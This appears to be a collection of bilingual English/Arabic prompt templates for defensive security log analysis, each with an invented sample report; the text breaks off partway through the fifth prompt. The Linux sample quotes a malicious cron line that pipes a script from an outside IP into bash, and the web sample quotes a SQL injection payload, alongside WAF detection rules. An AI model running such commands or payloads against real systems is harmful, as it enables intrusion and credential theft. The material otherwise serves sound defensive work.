# Log Analysis Techniques - Prompts Collection

A comprehensive collection of bilingual prompts for cybersecurity log analysis covering various systems and detection methodologies.

---

## Prompt 1: Windows Event Log Analysis

### Description
A comprehensive prompt for analyzing Windows Event Logs to detect security incidents, suspicious activities, and potential compromise indicators across authentication, process execution, and system events.

### Tags
`windows-event-logs` `blue-team` `incident-response` `SIEM` `authentication-analysis`

---

## 🇬🇧 English Prompt

```
You are a senior Blue Team analyst specializing in Windows security monitoring. Analyze the provided Windows Event Logs and perform a comprehensive security assessment.

**Your Task:**
1. Authentication Analysis:
   - Identify failed login attempts (Event ID 4625) and detect brute force patterns
   - Analyze successful logins (Event ID 4624) for unusual timing, source IPs, or user accounts
   - Detect Pass-the-Hash and Pass-the-Ticket attacks (Event IDs 4768, 4769, 4624 with Logon Type 3)
   - Identify lateral movement indicators through network logons

2. Process Execution Review:
   - Analyze Process Creation events (Event ID 4688) for suspicious command lines
   - Detect PowerShell abuse, encoded commands, and suspicious scripts
   - Identify LOLBins (Living Off The Land Binaries) usage
   - Flag unusual parent-child process relationships

3. Privilege Escalation Detection:
   - Monitor for Token Manipulation (Event ID 4672)
   - Detect new service creation (Event ID 7045)
   - Identify scheduled task creation (Event ID 4698)
   - Alert on user account modifications (Event IDs 4720, 4722, 4738)

4. Persistence Mechanisms:
   - Registry modification events
   - Startup folder changes
   - WMI event subscription creation

**Input Format:**
- Provide logs in EVTX format description or raw event data
- Specify the time range for analysis
- Include the environment context (workstation/server/domain controller)

**Output Requirements:**
- Executive summary with threat level (Low/Medium/High/Critical)
- Timeline of suspicious events
- MITRE ATT&CK mapping for detected TTPs
- Specific Event IDs flagged with evidence
- Recommended remediation steps
- IOC extraction (IPs, hashes, domains, file paths)
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت محلل بارز في فريق الدفاع السيبراني (Blue Team) متخصص في مراقبة أمان أنظمة ويندوز. قم بتحليل سجلات أحداث ويندوز المقدمة وأجرِ تقييماً أمنياً شاملاً.

**مهمتك:**
1. تحليل المصادقة:
   - تحديد محاولات تسجيل الدخول الفاشلة (معرف الحدث 4625) وكشف أنماط هجمات القوة الغاشمة
   - تحليل عمليات تسجيل الدخول الناجحة (معرف الحدث 4624) للكشف عن الأوقات غير المعتادة أو عناوين IP المصدر أو حسابات المستخدمين المشبوهة
   - كشف هجمات Pass-the-Hash و Pass-the-Ticket (معرفات الأحداث 4768، 4769، 4624 مع نوع تسجيل الدخول 3)
   - تحديد مؤشرات الحركة الجانبية عبر عمليات تسجيل الدخول الشبكية

2. مراجعة تنفيذ العمليات:
   - تحليل أحداث إنشاء العمليات (معرف الحدث 4688) للكشف عن سطور أوامر مشبوهة
   - كشف إساءة استخدام PowerShell والأوامر المشفرة والبرامج النصية المشبوهة
   - تحديد استخدام أدوات النظام الأصلية (LOLBins) لأغراض خبيثة
   - وضع علامات على العلاقات غير المعتادة بين العمليات الأم والعمليات الابنة

3. كشف تصعيد الصلاحيات:
   - مراقبة التلاعب بالرموز الأمنية (معرف الحدث 4672)
   - كشف إنشاء خدمات جديدة (معرف الحدث 7045)
   - تحديد إنشاء المهام المجدولة (معرف الحدث 4698)
   - التنبيه على تعديلات حسابات المستخدمين (معرفات الأحداث 4720، 4722، 4738)

4. آليات الثبات:
   - أحداث تعديل سجل النظام
   - تغييرات مجلد بدء التشغيل
   - إنشاء اشتراكات أحداث WMI

**تنسيق الإدخال:**
- تقديم السجلات بوصف تنسيق EVTX أو بيانات الأحداث الخام
- تحديد النطاق الزمني للتحليل
- تضمين سياق البيئة (محطة عمل/خادم/وحدة تحكم النطاق)

**متطلبات المخرجات:**
- ملخص تنفيذي مع مستوى التهديد (منخفض/متوسط/مرتفع/حرج)
- جدول زمني للأحداث المشبوهة
- ربط التكتيكات والتقنيات والإجراءات المكتشفة بإطار MITRE ATT&CK
- معرفات الأحداث المحددة مع الأدلة
- خطوات المعالجة الموصى بها
- استخراج مؤشرات الاختراق (عناوين IP، التجزئات، النطاقات، مسارات الملفات)
```

---

## Example Output Preview

```
## Windows Event Log Analysis Report

### Executive Summary
**Threat Level:** HIGH
**Analysis Period:** 2024-01-15 08:00 - 2024-01-15 18:00 UTC
**Total Events Analyzed:** 15,847
**Alerts Generated:** 12

---

### Key Findings

| Time (UTC) | Event ID | Severity | Description |
|------------|----------|----------|-------------|
| 09:23:45 | 4625 | High | Brute force attempt on 'admin' account (47 failures in 3 min) |
| 10:15:22 | 4688 | Critical | PowerShell encoded command execution detected |
| 11:45:33 | 4624 | Medium | Unusual logon from external IP 185.220.101.xx |
| 14:22:18 | 4672 | High | Privilege assignment to compromised service account |
| 15:30:44 | 4698 | Critical | Scheduled task creation for persistence |

### MITRE ATT&CK Mapping
- T1110.001: Brute Force - Password Guessing
- T1059.001: PowerShell Command Execution
- T1021: Remote Services (Lateral Movement)
- T1078: Valid Accounts
- T1053.005: Scheduled Task

### Extracted IOCs
- Source IPs: 185.220.101.xx, 192.168.1.105
- File Hashes: a3f2b8c9d4e5f6g7h8i9j0k1l2m3n4o5
- Suspicious Files: C:\Temp\update.exe, C:\Windows\Tasks\sch.bat
- Command Lines: powershell -enc JABjAGwAaQBlAG4AdAA...

### Recommended Actions
1. Isolate affected workstation WS-FINANCE-042
2. Reset credentials for compromised accounts
3. Block identified external IPs at perimeter firewall
4. Deploy additional monitoring on domain controller
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 2: Linux Log Analysis

### Description
An in-depth prompt for analyzing Linux system logs including auth logs, syslog, auditd logs, and application logs to detect intrusion attempts, privilege escalation, and malicious activities.

### Tags
`linux-logs` `auditd` `syslog` `privilege-escalation` `incident-response`

---

## 🇬🇧 English Prompt

```
You are an expert Linux security analyst. Perform a comprehensive security analysis of Linux system logs to identify potential security incidents and attack indicators.

**Your Task:**
1. Authentication Analysis:
   - Analyze /var/log/auth.log and /var/log/secure for:
     - Failed SSH login attempts and brute force patterns
     - Successful logins from unusual locations/times
     - Sudo command execution and privilege escalation attempts
     - New user creation or modification events
     - SSH key-based authentication anomalies

2. System Log Review (/var/log/syslog, /var/log/messages):
   - Service startup/shutdown anomalies
   - Kernel-level alerts and OOM killer events
   - Cron job modifications and suspicious scheduled tasks
   - Unexpected service restarts or configuration changes

3. Auditd Log Analysis:
   - File access violations and permission changes
   - System call monitoring for suspicious activity
   - User activity tracking and behavioral analysis
   - Time-stamp manipulation detection

4. Web Server & Application Logs:
   - Apache/Nginx access and error logs correlation
   - SQL injection and XSS attempt detection
   - Directory traversal and file inclusion attempts
   - API abuse patterns

5. Persistence Mechanism Detection:
   - Cron job analysis for malicious entries
   - Systemd service unit modifications
   - SSH authorized_keys changes
   - Shell profile modifications (.bashrc, .profile)

**Input Format:**
- Provide logs in plain text format with timestamps
- Specify Linux distribution (Ubuntu, CentOS, RHEL, etc.)
- Include time range and server role (web server, database, etc.)

**Analysis Framework:**
- Statistical analysis (event frequency, anomaly detection)
- Pattern matching for known attack signatures
- Behavioral baseline comparison
- Cross-log correlation

**Output Requirements:**
- Severity classification for each finding
- Timeline reconstruction of attack chain
- IOC extraction and threat intelligence context
- Evidence preservation recommendations
- Remediation and hardening suggestions
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت محلل خبير في أمن أنظمة لينكس. قم بإجراء تحليل أمني شامل لسجلات نظام لينكس لتحديد الحوادث الأمنية المحتملة ومؤشرات الهجوم.

**مهمتك:**
1. تحليل المصادقة:
   - تحليل /var/log/auth.log و /var/log/secure للكشف عن:
     - محاولات تسجيل الدخول SSH الفاشلة وأنماط الهجمات بالقوة الغاشمة
     - عمليات تسجيل الدخول الناجحة من مواقع أو أوقات غير معتادة
     - تنفيذ أوامر Sudo ومحاولات تصعيد الصلاحيات
     - أحداث إنشاء أو تعديل المستخدمين الجدد
     - الشذوذ في المصادقة القائمة على مفاتيح SSH

2. مراجعة سجلات النظام (/var/log/syslog، /var/log/messages):
   - الشذوذ في بدء/إيقاف الخدمات
   - تنبيهات مستوى النواة وأحداث OOM killer
   - تعديلات Cron jobs والمهام المجدولة المشبوهة
   - إعادة تشغيل الخدمات غير المتوقعة أو تغييرات التكوين

3. تحليل سجلات Auditd:
   - انتهاكات الوصول للملفات وتغييرات الأذونات
   - مراقبة استدعاءات النظام للأنشطة المشبوهة
   - تتبع نشاط المستخدم والتحليل السلوكي
   - كشف التلاعب بالطوابع الزمنية

4. سجلات خوادم الويب والتطبيقات:
   - ربط سجلات الوصول والأخطاء لـ Apache/Nginx
   - كشف محاولات حقن SQL و XSS
   - محاولات اجتياز الدلائل وإدراج الملفات
   - أنماط إساءة استخدام واجهات برمجة التطبيقات

5. كشف آليات الثبات:
   - تحليل Cron jobs للإدخالات الخبيثة
   - تعديلات وحدات خدمة Systemd
   - تغييرات مفاتيح SSH المصرح بها
   - تعديلات ملفات تعريف الصدفة (.bashrc، .profile)

**تنسيق الإدخال:**
- تقديم السجلات بتنسيق نص عادي مع الطوابع الزمنية
- تحديد توزيعة لينكس (Ubuntu، CentOS، RHEL، إلخ)
- تضمين النطاق الزمني ودور الخادم (خادم ويب، قاعدة بيانات، إلخ)

**إطار التحليل:**
- التحليل الإحصائي (تكرار الأحداث، كشف الشذوذ)
- مطابقة الأنماط للتوقيعات الهجومية المعروفة
- مقارنة الخط الأساسي السلوكي
- الارتباط بين السجلات المتعددة

**متطلبات المخرجات:**
- تصنيف الخطورة لكل نتيجة
- إعادة بناء الجدول الزمني لسلسلة الهجوم
- استخراج مؤشرات الاختراق وسياق الاستخبارات التهديدية
- توصيات حفظ الأدلة
- اقتراحات المعالجة والتقوية الأمنية
```

---

## Example Output Preview

```
## Linux Log Analysis Report

### System Information
- **Hostname:** webserver-prod-01
- **Distribution:** Ubuntu 22.04 LTS
- **Analysis Period:** 2024-01-15 00:00 - 2024-01-15 23:59 UTC
- **Log Sources:** auth.log, syslog, audit/audit.log, nginx/access.log

---

### Summary Statistics
| Metric | Count | Status |
|--------|-------|--------|
| Total SSH Attempts | 4,847 | Normal |
| Failed SSH Logins | 3,245 | ⚠️ Elevated |
| Sudo Commands | 127 | Normal |
| Cron Executions | 89 | Normal |
| Service Restarts | 3 | ⚠️ Review |

---

### Critical Findings

#### 1. SSH Brute Force Attack (CRITICAL)
**Time:** 2024-01-15 02:14:23 - 02:47:18 UTC
**Source:** Multiple IPs (Tor exit nodes detected)
**Target Users:** root, admin, ubuntu, test
**Pattern:** Distributed brute force, 3,245 attempts

```bash
Jan 15 02:14:23 webserver sshd[28471]: Failed password for root from 192.241.xxx.xxx port 52341 ssh2
Jan 15 02:15:01 webserver sshd[28473]: Failed password for admin from 192.241.xxx.xxx port 52389 ssh2
```

#### 2. Suspicious Cron Job Created (HIGH)
**Time:** 2024-01-15 14:33:12 UTC
**User:** www-data
**Command:** */5 * * * * curl -s http://185.xxx.xxx.xxx/update.sh | bash

#### 3. Privilege Escalation Attempt (HIGH)
**Time:** 2024-01-15 16:22:45 UTC
**Evidence:**
```bash
Jan 15 16:22:45 webserver sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
```

---

### Extracted IOCs
| Type | Value | Context |
|------|-------|---------|
| IP | 192.241.xxx.xxx | SSH brute force source |
| IP | 185.xxx.xxx.xxx | C2 server |
| URL | http://185.xxx.xxx.xxx/update.sh | Malicious script |
| File | /tmp/.hidden/.ssh-agent | Backdoor |

---

### Recommended Actions
1. Block identified IPs using iptables/ufw
2. Implement fail2ban with stricter rules
3. Audit www-data cron jobs and remove malicious entry
4. Review sudoers configuration
5. Rotate SSH keys and enforce key-only authentication
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 3: Web Server Log Analysis

### Description
A specialized prompt for analyzing web server logs (Apache, Nginx, IIS) to detect web application attacks, scanning activities, data exfiltration attempts, and suspicious access patterns.

### Tags
`web-server-logs` `OWASP` `web-attacks` `apache` `nginx` `application-security`

---

## 🇬🇧 English Prompt

```
You are a web security specialist tasked with analyzing web server access and error logs for security incidents and attack patterns.

**Your Task:**
1. Attack Pattern Detection:
   - SQL Injection attempts (UNION, SELECT, INSERT, DROP patterns)
   - Cross-Site Scripting (XSS) payloads in URLs and parameters
   - Local/Remote File Inclusion (LFI/RFI) attempts
   - Directory traversal attacks (../ sequences)
   - Command injection patterns (;, |, &, $, backticks)

2. Scanner & Bot Detection:
   - Automated vulnerability scanner signatures (Nikto, SQLMap, Nmap, etc.)
   - Directory enumeration attempts
   - Sensitive file probing (wp-admin, .env, config.php, backup files)
   - Crawler behavior analysis

3. Authentication & Authorization Analysis:
   - Brute force login attempts
   - Session hijacking indicators
   - Privilege escalation attempts
   - Password spraying patterns

4. Data Exfiltration Indicators:
   - Large outbound data transfers
   - Unusual file access patterns
   - Database dump indicators
   - API abuse and scraping activities

5. Behavioral Analysis:
   - Geographic anomaly detection (impossible travel)
   - Time-based anomaly detection
   - User-Agent analysis for spoofing
   - HTTP method usage anomalies (unusual PUT, DELETE, TRACE)

**Log Format Support:**
- Apache Combined Log Format
- Nginx default log format
- IIS W3C Extended Log Format
- Custom JSON log formats

**Input Requirements:**
- Raw log entries or log file excerpt
- Server type and version
- Application context (e-commerce, CMS, API, etc.)
- Time range for analysis

**Output Requirements:**
- Attack classification with confidence score
- Source IP reputation summary
- Affected endpoints and parameters
- Request/Response analysis for each incident
- WAF rule recommendations
- MITRE ATT&CK and OWASP Top 10 mapping
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت متخصص في أمن تطبيقات الويب مكلف بتحليل سجلات الوصول والأخطاء لخادم الويب للكشف عن الحوادث الأمنية وأنماط الهجوم.

**مهمتك:**
1. كشف أنماط الهجوم:
   - محاولات حقن SQL (أنماط UNION، SELECT، INSERT، DROP)
   - حمولات البرمجة عبر المواقع (XSS) في الروابط والمعاملات
   - محاولات إدراج الملفات المحلية/البعيدة (LFI/RFI)
   - هجمات اجتياز الدلائل (تسلسلات ../)
   - أنماط حقن الأوامر (؛، |، &، $، الفاصلة العكسية)

2. كشف الماسحات الضوئية والروبوتات:
   - تواقيع ماسحات الثغرات الآلية (Nikto، SQLMap، Nmap، إلخ)
   - محاولات تعداد الدلائل
   - استكشاف الملفات الحساسة (wp-admin، .env، config.php، ملفات النسخ الاحتياطي)
   - تحليل سلوك برامج الزحف

3. تحليل المصادقة والتفويض:
   - محاولات تسجيل الدخول بالقوة الغاشمة
   - مؤشرات اختطاف الجلسات
   - محاولات تصعيد الصلاحيات
   - أنماط رش كلمات المرور

4. مؤشرات تسريب البيانات:
   - عمليات نقل البيانات الصادرة الكبيرة
   - أنماط الوصول للملفات غير المعتادة
   - مؤشرات تفريغ قواعد البيانات
   - إساءة استخدام واجهات برمجة التطبيقات وأنشطة الاستخراج

5. التحليل السلوكي:
   - كشف الشذوذ الجغرافي (السفر المستحيل)
   - كشف الشذوذ الزمني
   - تحليل وكيل المستخدم للتمويه
   - شذوذ استخدام طرق HTTP (PUT، DELETE، TRACE غير المعتادة)

**دعم تنسيق السجلات:**
- تنسيق سجل Apache المدمج
- تنسيق سجل Nginx الافتراضي
- تنسيق سجل IIS الموسع W3C
- تنسيقات سجل JSON المخصصة

**متطلبات الإدخال:**
- إدخالات السجل الخام أو مقتطف من ملف السجل
- نوع الخادم وإصداره
- سياق التطبيق (تجارة إلكترونية، نظام إدارة المحتوى، واجهة برمجة تطبيقات، إلخ)
- النطاق الزمني للتحليل

**متطلبات المخرجات:**
- تصنيف الهجوم مع درجة الثقة
- ملخص سمعة عنوان IP المصدر
- نقاط النهاية والمعاملات المتأثرة
- تحليل الطلب/الاستجابة لكل حادث
- توصيات قواعد جدار الحماية التطبيقي (WAF)
- ربط بـ MITRE ATT&CK و OWASP Top 10
```

---

## Example Output Preview

```
## Web Server Log Analysis Report

### Server Information
- **Server Type:** Nginx 1.22.1
- **Application:** E-commerce Platform
- **Analysis Period:** 2024-01-15 06:00 - 18:00 UTC
- **Total Requests:** 247,892

---

### Attack Summary

| Attack Type | Count | Severity | Blocked |
|-------------|-------|----------|---------|
| SQL Injection | 23 | Critical | 21 |
| XSS Attempts | 47 | High | 45 |
| Directory Traversal | 15 | High | 15 |
| Scanner Activity | 156 | Medium | 156 |
| Brute Force Login | 312 | High | 290 |
| LFI/RFI | 8 | Critical | 8 |

---

### Critical Incidents

#### Incident #1: SQL Injection Attempt
**Time:** 2024-01-15 09:23:15 UTC
**Source IP:** 45.33.xxx.xxx
**Target:** /api/products?id=
**Severity:** CRITICAL
**Confidence:** 95%

```
Raw Request:
GET /api/products?id=1%27%20UNION%20SELECT%20username,password,1,2,3%20FROM%20users-- HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)
```

**Decoded Payload:**
```
id=1' UNION SELECT username,password,1,2,3 FROM users--
```

**Status:** Blocked by WAF (Rule: 942100)

---

#### Incident #2: Credential Stuffing Attack
**Time:** 2024-01-15 14:00:00 - 14:45:00 UTC
**Source IPs:** Multiple (botnet indicators)
**Target:** /login
**Attempts:** 312 login attempts across 89 IPs

**Attack Pattern:**
- Same username tested with multiple passwords
- Randomized User-Agent strings
- Requests spaced 5-10 seconds apart
- Success detected: 3 valid credential pairs

---

### OWASP Top 10 Mapping
| ID | Category | Incidents |
|----|----------|-----------|
| A01 | Broken Access Control | 12 |
| A03 | Injection | 31 |
| A07 | Authentication Failures | 312 |

---

### WAF Rule Recommendations
```
# SQL Injection Blocking
SecRule ARGS "@rx (?i:union.*select|select.*from)" \
    "id:1001,phase:2,deny,log,msg:'SQL Injection Detected'"

# XSS Blocking
SecRule ARGS "@rx (?i:<script|javascript:|onerror=)" \
    "id:1002,phase:2,deny,log,msg:'XSS Attack Detected'"

# Rate Limiting for Login
SecAction "id:1003,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR}"
SecRule IP:LOGIN_COUNT "@gt 10" \
    "id:1004,phase:2,deny,log,msg:'Brute Force Detected'"
```

---

### Recommended Actions
1. Force password reset for compromised accounts
2. Implement CAPTCHA on login page
3. Deploy IP-based rate limiting
4. Enable real-time alerting for SQL injection attempts
5. Conduct code review on /api/products endpoint
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 4: Firewall Log Analysis

### Description
A comprehensive prompt for analyzing firewall logs to detect network intrusions, policy violations, data exfiltration, command and control communications, and advanced persistent threats.

### Tags
`firewall-logs` `network-security` `threat-detection` `C2` `data-exfiltration`

---

## 🇬🇧 English Prompt

```
You are a senior network security analyst specializing in firewall log analysis and network traffic investigation. Analyze the provided firewall logs to identify security threats and anomalous network behavior.

**Your Task:**
1. Traffic Pattern Analysis:
   - Identify unusual outbound connections to external IPs
   - Detect beacon-like behavior (regular interval connections)
   - Analyze traffic volume anomalies (spikes, unusual protocols)
   - Monitor for DNS tunneling indicators
   - Identify port scanning and reconnaissance activities

2. Command & Control Detection:
   - Detect beacon patterns with timing analysis
   - Identify connections to known malicious IPs/domains
   - Analyze encrypted traffic patterns to suspicious destinations
   - Detect heartbeat communications
   - Identify TOR and proxy usage

3. Data Exfiltration Detection:
   - Large data transfers to external destinations
   - Unusual protocol usage for data transfer
   - Staged exfiltration patterns
   - Cloud storage abuse indicators
   - Time-based exfiltration (off-hours transfers)

4. Lateral Movement Detection:
   - Internal host-to-host connections
   - Remote desktop and SMB traffic analysis
   - Unusual port usage between internal hosts
   - Pass-the-hash network indicators
   - Admin tool abuse patterns (PsExec, WMI)

5. Policy Violation Detection:
   - Unauthorized protocol usage
   - Blocked traffic analysis and trends
   - Shadow IT detection (unauthorized cloud services)
   - VPN and remote access anomalies
   - Ingress/egress rule violations

**Supported Firewall Types:**
- Cisco ASA/FTD
- Palo Alto Networks (PAN-OS)
- Fortinet FortiGate
- Check Point
- pfSense/OPNsense
- AWS Security Groups / Azure NSG

**Input Requirements:**
- Firewall log format specification
- Network topology context (internal subnets, DMZ, etc.)
- Time range for analysis
- Any known incidents or context

**Output Requirements:**
- Threat prioritization matrix
- Network traffic timeline
- Source/destination correlation analysis
- Indicators of Compromise (IOCs) with threat intelligence enrichment
- Firewall rule optimization recommendations
- Incident escalation criteria
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت محلل أمن شبكات أول متخصص في تحليل سجلات جدار الحماية والتحقيق في حركة مرور الشبكة. قم بتحليل سجلات جدار الحماية المقدمة لتحديد التهديدات الأمنية والسلوك الشاذ في الشبكة.

**مهمتك:**
1. تحليل أنماط حركة المرور:
   - تحديد الاتصالات الصادرة غير المعتادة إلى عناوين IP خارجية
   - كشف السلوك الشبيه بالمنارات (اتصالات بفواصل زمنية منتظمة)
   - تحليل الشذوذ في حجم حركة المرور (ارتفاعات، بروتوكولات غير معتادة)
   - مراقبة مؤشرات نفق DNS
   - تحديد أنشطة مسح المنافذ والاستطلاع

2. كشف القيادة والسيطرة (C2):
   - كشف أنماط المنارات مع تحليل التوقيت
   - تحديد الاتصالات بعناوين IP/نطاقات خبيثة معروفة
   - تحليل أنماط حركة المرور المشفرة إلى وجهات مشبوهة
   - كشف اتصالات نبضات القلب
   - تحديد استخدام شبكة TOR والوكلاء

3. كشف تسريب البيانات:
   - عمليات نقل البيانات الكبيرة إلى وجهات خارجية
   - استخدام بروتوكولات غير معتادة لنقل البيانات
   - أنماط التسريب المرحلي
   - مؤشرات إساءة استخدام التخزين السحابي
   - التسريب القائم على الوقت (عمليات نقل خارج ساعات العمل)

4. كشف الحركة الجانبية:
   - اتصالات بين المضيفين الداخليين
   - تحليل حركة مرور سطح المكتب البعيد و SMB
   - استخدام المنافذ غير المعتاد بين المضيفين الداخليين
   - مؤشرات شبكة Pass-the-Hash
   - أنماط إساءة استخدام أدوات الإدارة (PsExec، WMI)

5. كشف انتهاكات السياسة:
   - استخدام بروتوكولات غير مصرح بها
   - تحليل حركة المرور المحظورة والاتجاهات
   - كشف تكنولوجيا المعلومات الظلية (خدمات سحابية غير مصرح بها)
   - شذوذ VPN والوصول البعيد
   - انتهاكات قواعد الدخول/الخروج

**أنواع جدران الحماية المدعومة:**
- Cisco ASA/FTD
- Palo Alto Networks (PAN-OS)
- Fortinet FortiGate
- Check Point
- pfSense/OPNsense
- AWS Security Groups / Azure NSG

**متطلبات الإدخال:**
- مواصفات تنسيق سجل جدار الحماية
- سياق طوبولوجيا الشبكة (الشبكات الفرعية الداخلية، المنطقة منزوعة السلاح، إلخ)
- النطاق الزمني للتحليل
- أي حوادث معروفة أو سياق

**متطلبات المخرجات:**
- مصفوفة أولويات التهديدات
- الجدول الزمني لحركة مرور الشبكة
- تحليل الارتباط بين المصدر/الوجهة
- مؤشرات الاختراق مع إثراء الاستخبارات التهديدية
- توصيات تحسين قواعد جدار الحماية
- معايير تصعيد الحوادث
```

---

## Example Output Preview

```
## Firewall Log Analysis Report

### Environment Context
- **Firewall Type:** Palo Alto Networks PA-5220
- **Network Segment:** Corporate Network (10.0.0.0/8)
- **Analysis Period:** 2024-01-15 00:00 - 23:59 UTC
- **Total Log Entries:** 1,847,293

---

### Executive Summary

| Category | Events | Critical | High | Medium |
|----------|--------|----------|------|--------|
| Blocked Traffic | 47,892 | 23 | 156 | 712 |
| Allowed Traffic | 1,799,401 | - | 89 | 234 |
| Threat Detection | 312 | 45 | 89 | 178 |

---

### Critical Findings

#### Finding #1: C2 Beacon Activity Detected
**Severity:** CRITICAL
**Detection Time:** 2024-01-15 08:23:45 UTC
**Source:** Workstation 10.0.45.123 (WS-HR-015)
**Destination:** 185.220.xxx.xxx:443
**Pattern:** Regular HTTPS connections every 300 seconds

```
Timeline Analysis:
08:23:45 - 185.220.xxx.xxx:443 - 452 bytes - HTTPS
08:28:47 - 185.220.xxx.xxx:443 - 448 bytes - HTTPS  
08:33:45 - 185.220.xxx.xxx:443 - 451 bytes - HTTPS
08:38:46 - 185.220.xxx.xxx:443 - 449 bytes - HTTPS
[Pattern continues for 6 hours]
```

**Threat Intelligence:** IP associated with APT29 (Cozy Bear) infrastructure
**MITRE ATT&CK:** T1071.001 (Web Protocols), T1568.003 (Domain Generation Algorithms)

---

#### Finding #2: Data Exfiltration Attempt
**Severity:** CRITICAL
**Detection Time:** 2024-01-15 02:15:00 - 02:47:00 UTC
**Source:** Server 10.0.10.50 (DB-PROD-01)
**Destination:** 45.33.xxx.xxx:22
**Data Volume:** 2.3 GB transferred

```
Connection Summary:
Total Bytes Sent: 2,389,456,789
Total Bytes Received: 15,234
Duration: 32 minutes
Protocol: SSH (encrypted)
```

**Indicators:**
- Off-hours activity (2:00 AM)
- Large data volume to external IP
- SSH protocol from database server (unusual)
- IP reputation: Malicious (Spamhaus, AbuseIPDB)

---

#### Finding #3: Lateral Movement Detected
**Severity:** HIGH
**Detection Time:** 2024-01-15 10:45:00 UTC
**Source:** 10.0.45.123 → Multiple internal hosts
**Activity:** SMB and RDP scanning

```
Internal Connections from WS-HR-015:
10.0.45.123 → 10.0.10.1:445 (SMB) - ALLOWED
10.0.45.123 → 10.0.10.2:445 (SMB) - ALLOWED
10.0.45.123 → 10.0.20.5:3389 (RDP) - BLOCKED
10.0.45.123 → 10.0.20.6:3389 (RDP) - BLOCKED
10.0.45.123 → 10.0.30.1:445 (SMB) - ALLOWED
```

---

### Extracted IOCs

| Type | Value | Reputation | Context |
|------|-------|------------|---------|
| IP | 185.220.xxx.xxx | Malicious | C2 Server (APT29) |
| IP | 45.33.xxx.xxx | Malicious | Exfil Destination |
| Domain | update-service[.]xyz | Suspicious | DGA Pattern |
| Port | 4444/TCP | Suspicious | Unusual outbound |

---

### Firewall Rule Recommendations

```panos
# Block C2 Communication
set rulebase security rules Block-C2 source any destination 185.220.xxx.xxx
  application any service any action deny

# Restrict Database Server Egress  
set rulebase security rules DB-Restrict source 10.0.10.50 destination any
  application ssh service application-default action deny

# Alert on SMB from Workstations
set rulebase security rules SMB-Alert source 10.0.45.0/24 destination 10.0.10.0/24
  application smb service application-default action allow
  log-start yes log-end yes
```

---

### Immediate Actions Required
1. Isolate WS-HR-015 from network
2. Block 185.220.xxx.xxx and 45.33.xxx.xxx at perimeter
3. Initiate IR process for DB-PROD-01
4. Review all accounts accessed from compromised workstation
5. Enable enhanced logging on critical segments
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 5: Correlation and Pattern Detection

### Description
An advanced prompt for multi-source log correlation, behavioral analysis, and pattern detection across heterogeneous security data sources to identify complex attack campaigns and advanced persistent threats.

### Tags
`log-correlation` `SIEM` `threat-hunting` `behavioral-analysis` `APT-detection`

---

## 🇬🇧 English Prompt

```
You are a senior threat hunter and security analytics expert. Perform advanced correlation analysis across multiple log sources to detect sophisticated attack patterns and advanced persistent threats.

**Your Task:**
1. Multi-Source Log Correlation:
   - Correlate events across endpoint, network, and application logs
   - Link user activities across different systems and timeframes
   - Identify attack chains spanning multiple stages
   - Detect distributed attacks from multiple sources
   - Build timeline of attacker activities across infrastructure

2. Behavioral Analytics:
   - Establish baseline behavior for users, hosts, and network patterns
   - Detect anomalies in user access patterns (time, location, resources)
   - Identify impossible travel scenarios
   - Detect privilege escalation patterns
   - Monitor for unusual data access patterns

3. Attack Campaign Detection:
   - Identify related incidents across different detection sources
   - Detect low-and-slow attack techniques
   - Identify APT indicators and patterns
   - Correlate with threat intelligence feeds
   - Detect attack infrastructure reuse

4. Pattern Recognition:
   - Identify repetitive attack signatures
   - Detect coordinated attacks (Distributed, multi-vector)
   - Recognize reconnaissance patterns
   - Identify persistence mechanism combinations
   - Detect living-off-the-land technique patterns

5. Threat Intelligence Integration:
   - Enrich findings with external threat intelligence
   - Match observed patterns to known threat actor TTPs
   - Identify attack campaigns and attribution indicators
   - Correlate with MITRE ATT&CK framework
   - Map to Cyber Kill Chain phases

**Log Sources to Correlate:**
- Windows Event Logs (Security, System, Application)
- Linux/Unix logs (auth, syslog, auditd)
- Network logs (firewall, IDS/IPS, proxy, DNS)
- Application logs (web servers, databases, email)
- Cloud logs (AWS CloudTrail, Azure AD, GCP)
- Endpoint Detection and Response (EDR) data
- Identity and Access Management logs

**Analysis Methodology:**
- Time-series correlation analysis
- Entity relationship mapping
- Statistical anomaly detection
- Machine learning pattern recognition
- Hypothesis-based threat hunting

**Input Requirements:**
- Multiple log sources with timestamps (ISO 8601 format)
- Entity identifiers (users, hosts, IPs, sessions)
- Time range for analysis
- Known incidents or hunting hypotheses
- Baseline reference period (if available)

**Output Requirements:**
- Comprehensive attack narrative
- Visual timeline of correlated events
- Entity relationship diagram description
- Confidence scores for each correlation
- Threat actor attribution assessment
- MITRE ATT&CK technique mapping
- Executive summary with business impact
- Detailed technical analysis
- Recommendations for detection engineering
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت صائد تهديدات أول وخبير في تحليلات الأمن. قم بإجراء تحليل ارتباط متقدم عبر مصادر سجلات متعددة للكشف عن أنماط الهجوم المتطورة والتهديدات المستمرة المتقدمة.

**مهمتك:**
1. ارتباط السجلات متعددة المصادر:
   - ربط الأحداث عبر سجلات نقاط النهاية والشبكة والتطبيقات
   - ربط أنشطة المستخدم عبر أنظمة وأطر زمنية مختلفة
   - تحديد سلاسل الهجوم التي تمتد عبر مراحل متعددة
   - كشف الهجمات الموزعة من مصادر متعددة
   - بناء جدول زمني لأنشطة المهاجم عبر البنية التحتية

2. التحليلات السلوكية:
   - إنشاء سلوك أساسي للمستخدمين والمضيفين وأنماط الشبكة
   - كشف الشذوذ في أنماط وصول المستخدم (الوقت، الموقع، الموارد)
   - تحديد سيناريوهات السفر المستحيل
   - كشف أنماط تصعيد الصلاحيات
